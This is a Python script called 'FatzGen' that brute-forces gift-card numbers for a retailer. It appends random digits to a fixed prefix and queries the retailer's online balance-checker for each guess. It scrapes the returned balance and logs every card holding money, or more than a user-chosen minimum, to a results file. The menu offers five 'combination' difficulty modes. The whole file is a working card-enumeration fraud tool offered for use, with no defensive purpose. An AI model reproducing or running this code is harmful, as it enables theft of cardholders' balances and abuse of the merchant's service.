# Coded By TrapStar!!!
#
# https://www.youtube.com/channel/UCWgbOIAF6DxQmMQZK7JsTHg

from bs4 import BeautifulSoup
from colorama import init, Fore, Back, Style
import requests
import os
import time
import random

red = Fore.RED + Style.BRIGHT
green = Fore.GREEN + Style.BRIGHT

os.system("cls")

init(convert=True)

print(green + "FatzGen\nCoded By TrapStar!\n")

print(red + "1 - Easy Combination\n2 - Medium Combination\n3 - Hard Combination [Recommended]\n4 - Impossible Combination\n5 - Filtered\n")

choice = input("--> ")

if choice == "1":

	os.system("cls && title FatzGen - Easy Combination")

	checked = 0
	money = 0
	working = 0

	ROOT_PATH = os.path.dirname(os.path.abspath(__file__))
	results = os.path.join(ROOT_PATH, "results.txt")

	fatzapi = "https://fatz.com/balance-checker/?cn="
	fatzbasecode = "11440000"

	times = int(input("How many codes to check: "))

	os.system("cls")

	try:

		for i in range(times):
			checked = checked + 1
			one = str(random.randint(1,9))
			two = str(random.randint(1,9))
			three = str(random.randint(1,9))


			fatzcode = fatzbasecode+one+two+three

			fatz = fatzapi+fatzcode

			r = requests.get(fatz)

			soup = BeautifulSoup(r.text, 'html.parser')
			money = str(soup.find_all('b')[0].get_text())

			if money > "$0.01":

				money2 = money.replace("$","")

				money = money2 + money
				working = working + 1
				print(green+fatzcode+" | Balance: $"+money2)
				printing = fatzcode+" | Balance: $"+money2

				with open(results, 'a') as file:
					file.write(printing+"\n")

			elif money < "$0.01":
				print(red+fatzcode+" | Balance: "+money)

	except KeyboardInterrupt:

		os.system("cls")

		print(red + "Checked: "+green+str(checked))
		print(red + "Working: "+green+str(working) + red)

	os.system("cls")

	print(red + "Checked: "+green+str(checked))
	print(red + "Working: "+green+str(working) + red)

if choice == "3":

	os.system("cls && title FatzGen - Hard Combination")

	checked = 0
	money = 0
	working = 0

	ROOT_PATH = os.path.dirname(os.path.abspath(__file__))
	results = os.path.join(ROOT_PATH, "results.txt")

	fatzapi = "https://fatz.com/balance-checker/?cn="
	fatzbasecode = "114400"

	times = int(input("How many codes to check: "))

	os.system("cls")

	try:

		for i in range(times):
			checked = checked + 1
			one = str(random.randint(1,9))
			two = str(random.randint(1,9))
			three = str(random.randint(1,9))
			four = str(random.randint(1,9))
			five = str(random.randint(1,9))


			fatzcode = fatzbasecode+one+two+three+four+five

			fatz = fatzapi+fatzcode

			r = requests.get(fatz)

			soup = BeautifulSoup(r.text, 'html.parser')
			money = str(soup.find_all('b')[0].get_text())

			if money > "$0.01":

				money2 = money.replace("$","")

				money = money2 + money
				working = working + 1
				print(green+fatzcode+" | Balance: $"+money2)
				printing = fatzcode+" | Balance: $"+money2

				with open(results, 'a') as file:
					file.write(printing+"\n")

			elif money < "$0.01":
				print(red+fatzcode+" | Balance: "+money)

	except KeyboardInterrupt:

		os.system("cls")

		print(red + "Checked: "+green+str(checked))
		print(red + "Working: "+green+str(working) + red)

	os.system("cls")

	print(red + "Checked: "+green+str(checked))
	print(red + "Working: "+green+str(working) + red)

if choice == "2":

	os.system("cls && title FatzGen - Medium Combination")

	checked = 0
	money = 0
	working = 0

	ROOT_PATH = os.path.dirname(os.path.abspath(__file__))
	results = os.path.join(ROOT_PATH, "results.txt")

	red = Fore.RED + Style.BRIGHT
	green = Fore.GREEN + Style.BRIGHT

	fatzapi = "https://fatz.com/balance-checker/?cn="
	fatzbasecode = "1144000"

	times = int(input("How many codes to check: "))

	os.system("cls")

	try:

		for i in range(times):
			checked = checked + 1
			one = str(random.randint(1,9))
			two = str(random.randint(1,9))
			three = str(random.randint(1,9))
			four = str(random.randint(1,9))
			five = str(random.randint(1,9))


			fatzcode = fatzbasecode+one+two+three+four

			fatz = fatzapi+fatzcode

			r = requests.get(fatz)

			soup = BeautifulSoup(r.text, 'html.parser')
			money = str(soup.find_all('b')[0].get_text())

			if money > "$0.01":

				money2 = money.replace("$","")

				money = money2 + money
				working = working + 1
				print(green+fatzcode+" | Balance: $"+money2)
				printing = fatzcode+" | Balance: $"+money2

				with open(results, 'a') as file:
					file.write(printing+"\n")

			elif money < "$0.01":
				print(red+fatzcode+" | Balance: "+money)

	except KeyboardInterrupt:

		os.system("cls")

		print(red + "Checked: "+green+str(checked))
		print(red + "Working: "+green+str(working) + red)

	os.system("cls")

	print(red + "Checked: "+green+str(checked))
	print(red + "Working: "+green+str(working) + red)

if choice == "4":

	os.system("cls && title FatzGen - Impossible Combination")

	checked = 0
	money = 0
	working = 0

	ROOT_PATH = os.path.dirname(os.path.abspath(__file__))
	results = os.path.join(ROOT_PATH, "results.txt")

	red = Fore.RED + Style.BRIGHT
	green = Fore.GREEN + Style.BRIGHT

	fatzapi = "https://fatz.com/balance-checker/?cn="
	fatzbasecode = "114400"

	times = int(input("How many codes to check: "))

	os.system("cls")

	try:

		for i in range(times):
			checked = checked + 1
			one = str(random.randint(1,9))
			two = str(random.randint(1,9))
			three = str(random.randint(1,9))
			four = str(random.randint(1,9))
			five = str(random.randint(1,9))
			six = str(random.randint(1,9))


			fatzcode = fatzbasecode+one+two+three+four+five+six

			fatz = fatzapi+fatzcode

			r = requests.get(fatz)

			soup = BeautifulSoup(r.text, 'html.parser')
			money = str(soup.find_all('b')[0].get_text())

			if money > "$0.01":

				money2 = money.replace("$","")

				money = money2 + money
				working = working + 1
				print(green+fatzcode+" | Balance: $"+money2)
				printing = fatzcode+" | Balance: $"+money2

				with open(results, 'a') as file:
					file.write(printing+"\n")

			elif money < "$0.01":
				print(red+fatzcode+" | Balance: "+money)

	except KeyboardInterrupt:

		os.system("cls")

		print(red + "Checked: "+green+str(checked))
		print(red + "Working: "+green+str(working) + red)

	os.system("cls")

	print(red + "Checked: "+green+str(checked))
	print(red + "Working: "+green+str(working) + red)



if choice == "5":

	os.system("cls && title FatzGen - Filtered")

	checked = 0
	money = 0
	working = 0

	ROOT_PATH = os.path.dirname(os.path.abspath(__file__))
	results = os.path.join(ROOT_PATH, "results.txt")

	red = Fore.RED + Style.BRIGHT
	green = Fore.GREEN + Style.BRIGHT

	fatzapi = "https://fatz.com/balance-checker/?cn="
	fatzbasecode = "114400"


	moneyfiltered = int(input("Capture minimum $"))
	times = int(input("How many codes to check: "))

	os.system("cls")

	try:

		for i in range(times):
			checked = checked + 1
			one = str(random.randint(1,9))
			two = str(random.randint(1,9))
			three = str(random.randint(1,9))
			four = str(random.randint(1,9))
			five = str(random.randint(1,9))
			six = str(random.randint(1,9))
			fatzcode = fatzbasecode+one+two+three+four+five+six

			fatz = fatzapi+fatzcode

			r = requests.get(fatz)

			soup = BeautifulSoup(r.text, 'html.parser')
			money = str(soup.find_all('b')[0].get_text())

			money2 = money.replace("$","")

			money3 = "$"+money2

			moneyresult = float(money2)+int(moneyfiltered)

			if float(money2) > int(moneyfiltered):

				money = money2 + money
				working = working + 1
				print(green+fatzcode+" | Balance: "+money3)
				printing = fatzcode+" | Balance: "+money3

				with open(results, 'a') as file:
					file.write(printing+"\n")

			elif float(money2) < int(moneyfiltered):
				print(red+fatzcode+" | Balance: "+money3)

	except KeyboardInterrupt:

		os.system("cls")

		print(red + "Checked: "+green+str(checked))
		print(red + "Working: "+green+str(working) + red)

	os.system("cls")

	print(red + "Checked: "+green+str(checked))
	print(red + "Working: "+green+str(working) + red)
